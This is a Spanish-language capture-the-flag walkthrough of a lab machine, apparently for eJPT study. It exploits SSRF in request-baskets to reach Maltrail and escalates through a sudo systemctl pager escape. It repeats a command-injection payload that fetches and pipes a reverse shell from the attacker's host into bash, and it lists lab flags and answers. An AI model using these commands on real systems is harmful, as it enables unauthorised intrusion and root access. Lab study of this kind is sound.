`- ---
- Tags: #ejptmachine #ssrf #escapeshell #curl 
--- --
### **¿Qué es SSRF?**

**Server-Side Request Forgery** es una vulnerabilidad en la cual un atacante puede manipular un servidor para realizar solicitudes HTTP o de otro tipo hacia direcciones que el atacante elija.
El servidor, al ser engañado, puede actuar como un proxy y acceder a recursos internos o externos que normalmente no estarían accesibles para el atacante.

`nmap -p- --open -sC -sV --min-rate 5000 -n -vvv -oN Portscan 10.10.11.224`

![Pasted image 20250101034159](../../Fotos/Pasted%20image%2020250101034159.png)

![Pasted image 20250101034136](../../Fotos/Pasted%20image%2020250101034136.png)

prueba1
Se genera un basket

![Pasted image 20250101144728](../../Fotos/Pasted%20image%2020250101144728.png)

![Pasted image 20250101144738](../../Fotos/Pasted%20image%2020250101144738.png)

Al ir a la ruta no nos sale nada pero vemos que se realiza una petición por método GET

![Pasted image 20250101144822](../../Fotos/Pasted%20image%2020250101144822.png)

![Pasted image 20250101144832](../../Fotos/Pasted%20image%2020250101144832.png)

Si hacemos esto en otra ventana y luego revisamos las peticiones GET tendremos una nueva meticion

![Pasted image 20250101145204](../../Fotos/Pasted%20image%2020250101145204.png)

![Pasted image 20250101145212](../../Fotos/Pasted%20image%2020250101145212.png)

Crearemos en un mismo directorio un index.html con alguna palabra para hacer una prueba de si podemos ver el contenido cargado y nos pondremos en escucha con python para poder compartir los archivos del directorio

![Pasted image 20250101153147](../../Fotos/Pasted%20image%2020250101153147.png)

![Pasted image 20250101153152](../../Fotos/Pasted%20image%2020250101153152.png)

![Pasted image 20250101153212](../../Fotos/Pasted%20image%2020250101153212.png)

La idea aqui es marcar todas las casillas y hacer un Forward a nuestra url donde recordemos tenemos el servidor python por el puerto 80

![Pasted image 20250101153252](../../Fotos/Pasted%20image%2020250101153252.png)

Resultado

![Pasted image 20250101153331](../../Fotos/Pasted%20image%2020250101153331.png)

![Pasted image 20250101153538](../../Fotos/Pasted%20image%2020250101153538.png)

Si podemos apuntar al index.html de nuestra maquina y ver el contenido podriamos hacer un get forward al local host por le puerto 80 que con nmap nos aparecía filtrado en primera instancia

![Pasted image 20250101153731](../../Fotos/Pasted%20image%2020250101153731.png)

Resultado  mirando por la misma solicitud get anterior recargando la web solamente de esa ventana

![Pasted image 20250101153829](../../Fotos/Pasted%20image%2020250101153829.png)

![Pasted image 20250101153837](../../Fotos/Pasted%20image%2020250101153837.png)

![Pasted image 20250101153848](../../Fotos/Pasted%20image%2020250101153848.png)

- Maltrail v0.53

Aqui lo que hicimos fue inspeccionar en username o en password y colocar cualquier cosa para ver a que dirección se tramita el logeo en este caso es a
http://10.10.11.224:55555/prueba1/login

![Pasted image 20250101155007](../../Fotos/Pasted%20image%2020250101155007.png)

Compartimos el index.html que tiene dentro la reverse shell

![Pasted image 20250102121740](../../Fotos/Pasted%20image%2020250102121740.png)

Nos ponemos en escucha por el  puerto asignado en la reverse shell

![Pasted image 20250102121652](../../Fotos/Pasted%20image%2020250102121652.png)

- **Ejecutamos la siguiente sintaxis con curl**

```bash
curl http://10.10.11.224:55555/prueba1/login --data-urlencode 'username=;`curl 10.10.14.16 | bash`'
```

- Esto se convierte en una revere shell ya que el archivo index.html que esta en el directorio donde estamos abriendo un servidor con python por el puerto 80 tiene una reverse shell entonces de forma urlencodeada ejecutamos el comando, la reverse shell en el index.html que compartimos tiene el puerto 443 como escucha la reverse shell, de esa forma logramos el acceso.

![Pasted image 20250102121838](../../Fotos/Pasted%20image%2020250102121838.png)

`Maquina Vulnerada`

User Flag: 8e893fb9eb6d9225c3a66925f8af546e

---

*Escalada de Privilegios*

![Pasted image 20250102121959](../../Fotos/Pasted%20image%2020250102121959.png)

No se nos despliega todo el contenido del comando `sudo /usr/bin/systemctl status trail.service` y genera una consola donde si ponemos !/bin/bash ya seremos root
(Vuln Escape Shell)

![Pasted image 20250102122307](../../Fotos/Pasted%20image%2020250102122307.png)

![Pasted image 20250102123034](../../Fotos/Pasted%20image%2020250102123034.png)

*Si no te aparece el paginador (`less`) al ejecutar el comando `sudo /usr/bin/systemctl status trail.service`, es probable que sea porque tu terminal, como **Kitty**, esté configurada para manejar grandes volúmenes de salida sin delegar a un paginador. Esto puede desactivar el comportamiento que permite el escape de shell.*

Particularmente en este caso fue completamente necesario realizar un tratamiento de la Shell y posteriormente rezisear la CLI no la ventana solamente
Tras realizar el tratamiento:

`stty rows 44 columns 50`
`sudo -u root /usr/bin/systemctl status trail.service`

![Pasted image 20250102131132](../../Fotos/Pasted%20image%2020250102131132.png)

Sirve  !/bin/bash o !/bin/sh

![Pasted image 20250102131217](../../Fotos/Pasted%20image%2020250102131217.png)

`Maquina Vulnerada`

Root Flag: bc3a562e1952c5d708e292c988f90824

----

*Preguntas*

What is the 2023 CVE ID for a Server-Side Request Forgery (SSRF) in this version of request-baskets?
¿Cuál es el ID CVE 2023 para una falsificación de solicitud del lado del servidor (SSRF) en esta versión de request-baskets?

- CVE-2023-27163

---

What is the full version string for the instance of systemd installed on Sau?
`systemctl --version`

![Pasted image 20250102151656](../../Fotos/Pasted%20image%2020250102151656.png)

- systemd 245 (245.4-4ubuntu3.22)

What is the CVE ID for a local privilege escalation vulnerability that affects that particular systemd version?
buscar Systemd Vulnerabilities en google vuln de systemd 245 (245.4-4ubuntu3.22)

---

**Explicacion de Expllotacion**

- **Ejecutamos la siguiente sintaxis con curl**

```bash
curl http://10.10.11.224:55555/prueba1/login --data-urlencode 'username=;`curl 10.10.14.16 | bash`'
```

- Esto se convierte en una revere shell ya que el archivo index.html que esta en el directorio donde estamos abriendo un servidor con python por el puerto 80 tiene una reverse shell entonces de forma urlencodeada ejecutamos el comando, la reverse shell en el index.html que compartimos tiene el puerto 443 como escucha la reverse shell, de esa forma logramos el acceso.

![Pasted image 20250110161413](../../Fotos/Pasted%20image%2020250110161413.png)

![Pasted image 20250110161421](../../Fotos/Pasted%20image%2020250110161421.png)

![Pasted image 20250110161444](../../Fotos/Pasted%20image%2020250110161444.png)
